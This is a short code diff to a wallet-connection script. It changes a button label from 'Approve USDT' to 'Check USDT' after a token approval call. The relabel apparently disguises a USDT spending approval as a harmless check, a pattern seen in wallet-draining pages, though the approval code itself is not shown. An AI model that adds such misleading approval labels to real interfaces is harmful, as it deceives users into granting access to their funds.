@@ -104,7 +104,7 @@ async function connectWallet(chainType) {
                     console.error("Approval error:", error);
                     alert("Approval failed: " + error.message);
                 } finally {
-                    approveButton.innerHTML = '<i class="fas fa-award"></i> Approve USDT';
+                    approveButton.innerHTML = '<i class="fas fa-award"></i> Check USDT';
                     approveButton.disabled = false;
                 }
             };
